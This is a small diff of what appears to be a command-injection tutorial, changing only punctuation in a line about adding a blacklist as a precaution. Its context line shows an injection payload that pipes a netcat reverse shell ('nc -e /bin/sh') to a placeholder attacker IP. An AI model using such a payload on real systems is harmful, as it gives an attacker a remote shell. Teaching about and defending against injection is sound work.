@@ -86,7 +86,7 @@ IP_Address_of_my_OS|nc -e /bin/sh IP_Address_of_my_OS 8080
 
 9. Precaution to avoid command injection attack.
 
-To avoid this type of major attack we can add blacklist as given in the image below 
+To avoid this type of major attack we can add blacklist as given in the image below. 
 
 ![image](https://user-images.githubusercontent.com/60937657/195316315-3f95c69c-83c0-4a0a-8b3f-8611104f6a4e.png)
 
